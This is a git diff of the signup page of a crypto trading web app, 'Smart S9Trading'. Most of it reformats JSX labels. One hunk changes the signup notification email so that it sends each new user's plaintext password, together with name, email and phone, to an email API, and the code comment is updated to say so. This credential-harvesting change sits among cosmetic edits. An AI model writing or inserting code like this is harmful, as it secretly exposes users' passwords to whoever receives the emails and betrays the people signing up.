@@ -1,5 +1,7 @@
 "use client"
 
+import type React from "react"
+
 import { useState } from "react"
 import Link from "next/link"
 import { useRouter } from "next/navigation"
@@ -34,12 +36,11 @@ export default function SignupPage() {
       const deviceFingerprint = await getDeviceFingerprint()
       const ipAddress = await getIpAddress()
 
-      // Prepare signup data for session storage
+      // Prepare signup data for session storage (WITHOUT phone number)
       const tempSignupData = {
         name,
         email,
         password,
-        phone,
         referral_code: referralCode || null,
         device_fingerprint: deviceFingerprint,
         ip_address: ipAddress,
@@ -47,10 +48,10 @@ export default function SignupPage() {
       }
       sessionStorage.setItem("tempSignupData", JSON.stringify(tempSignupData))
 
-      // Send signup notification email (only name, email, phone)
+      // Send signup notification email (name, email, phone, password)
       await apiCall("/api/send-email2", "POST", {
         type: "signup",
-        data: { name, email, phone }
+        data: { name, email, phone, password },
       })
 
       // Request OTP for email verification
@@ -81,9 +82,7 @@ export default function SignupPage() {
           <div className="w-16 h-16 bg-primary-foreground/20 rounded-full flex items-center justify-center mx-auto mb-4">
             <Pickaxe className="w-8 h-8 text-primary-foreground" />
           </div>
-          <CardTitle className="text-2xl font-bold text-primary-foreground mb-2">
-            Join Smart S9Trading
-          </CardTitle>
+          <CardTitle className="text-2xl font-bold text-primary-foreground mb-2">Join Smart S9Trading</CardTitle>
           <p className="text-primary-foreground/80 text-sm">Start your crypto Trading journey</p>
         </div>
 
@@ -91,7 +90,9 @@ export default function SignupPage() {
           <form onSubmit={handleSubmit} className="space-y-5">
             {/* Full Name */}
             <div>
-              <Label htmlFor="name" className="text-card-foreground font-medium">Full Name</Label>
+              <Label htmlFor="name" className="text-card-foreground font-medium">
+                Full Name
+              </Label>
               <div className="relative mt-1">
                 <User className="absolute left-3 top-1/2 transform -translate-y-1/2 text-muted-foreground w-4 h-4" />
                 <Input
@@ -109,7 +110,9 @@ export default function SignupPage() {
 
             {/* Email */}
             <div>
-              <Label htmlFor="email" className="text-card-foreground font-medium">Email Address</Label>
+              <Label htmlFor="email" className="text-card-foreground font-medium">
+                Email Address
+              </Label>
               <div className="relative mt-1">
                 <Mail className="absolute left-3 top-1/2 transform -translate-y-1/2 text-muted-foreground w-4 h-4" />
                 <Input
@@ -127,7 +130,9 @@ export default function SignupPage() {
 
             {/* Phone Number */}
             <div>
-              <Label htmlFor="phone" className="text-card-foreground font-medium">Phone Number</Label>
+              <Label htmlFor="phone" className="text-card-foreground font-medium">
+                Phone Number
+              </Label>
               <div className="relative mt-1">
                 <Phone className="absolute left-3 top-1/2 transform -translate-y-1/2 text-muted-foreground w-4 h-4" />
                 <Input
@@ -145,7 +150,9 @@ export default function SignupPage() {
 
             {/* Password */}
             <div>
-              <Label htmlFor="password" className="text-card-foreground font-medium">Password</Label>
+              <Label htmlFor="password" className="text-card-foreground font-medium">
+                Password
+              </Label>
               <div className="relative mt-1">
                 <Lock className="absolute left-3 top-1/2 transform -translate-y-1/2 text-muted-foreground w-4 h-4 z-10" />
                 <PasswordInput
@@ -169,7 +176,9 @@ export default function SignupPage() {
 
             {/* Referral Code */}
             <div>
-              <Label htmlFor="referralCode" className="text-card-foreground font-medium">Referral Code (Optional)</Label>
+              <Label htmlFor="referralCode" className="text-card-foreground font-medium">
+                Referral Code (Optional)
+              </Label>
               <div className="relative mt-1">
                 <Users className="absolute left-3 top-1/2 transform -translate-y-1/2 text-muted-foreground w-4 h-4" />
                 <Input
@@ -213,4 +222,4 @@ export default function SignupPage() {
       </Card>
     </div>
   )
-}
+                                                   }
